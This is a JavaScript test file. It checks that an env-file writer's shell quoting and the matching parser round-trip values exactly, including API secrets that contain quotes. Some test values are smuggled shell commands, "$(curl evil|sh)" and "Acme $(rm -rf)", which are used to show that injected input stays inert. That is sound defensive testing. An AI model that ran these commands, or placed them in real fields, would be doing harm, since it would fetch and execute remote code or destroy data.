// kf-env-roundtrip.test.mjs — the writer (shq) and reader (parseEnvText) must be exact inverses (#6).
// The old reader stripped one surrounding quote pair, so any value carrying a `'` (the POSIX `'\''`
// idiom the writer emits) round-tripped WRONG — a corrupted API secret that "looked" fine.
import { test } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync, readFileSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { writeEnv, parseEnvText, unquoteEnvValue, shq } from "../connect.mjs";

test("#6 unquoteEnvValue inverts shq for quote-bearing, spaced, and metachar values", () => {
  for (const v of ["p1", "ab'cd", "a b c", "$(curl evil|sh)", "back`tick`", 'has"dq', "trailing'", "'leading", "a'b'c'd", ""]) {
    assert.equal(unquoteEnvValue(shq(v)), v, `round-trip failed for ${JSON.stringify(v)}`);
  }
});

test("#6 parseEnvText reads a written .kf-env back to the exact config values", () => {
  const dir = mkdtempSync(join(tmpdir(), "kfenv-rt-"));
  const envPath = join(dir, ".kf-env");
  const cfg = {
    projectId: "proj'42", projectName: "Acme $(rm -rf)", role: "admin", memStore: "m", memOrg: "o",
    controlPlaneUrl: "https://cp.example", apiToken: "tok'en`x", gcs: { bucket: "b", prefix: "p/x" },
    user: { sub: "u_1", email: "a@b.com" },
    kissflow: { subdomain: "acme-dev", accountId: "Ac00", apiKey: "k'ey", apiSecret: 'se"cret', target: "dev" },
  };
  writeEnv(cfg, envPath);
  const got = parseEnvText(readFileSync(envPath, "utf8"));
  assert.equal(got.KF_PROJECT_ID, "proj'42");
  assert.equal(got.KF_PROJECT_NAME, "Acme $(rm -rf)");   // NOT executed, NOT mangled
  assert.equal(got.KF_API_TOKEN, "tok'en`x");
  assert.equal(got.KISSFLOW_API_KEY, "k'ey");
  assert.equal(got.KISSFLOW_API_SECRET, 'se"cret');
  assert.equal(got.KISSFLOW_SUBDOMAIN, "acme-dev");
});

test("#6 parseEnvText decodes an unquoted (worker legacy-shape) line too", () => {
  assert.equal(parseEnvText("export KF_TARGET=dev\n").KF_TARGET, "dev");
  assert.equal(parseEnvText('KISSFLOW_API_KEY="quoted"\n').KISSFLOW_API_KEY, "quoted");
  assert.deepEqual(parseEnvText("# comment\n\n  export X='y z'\n"), { X: "y z" });
});
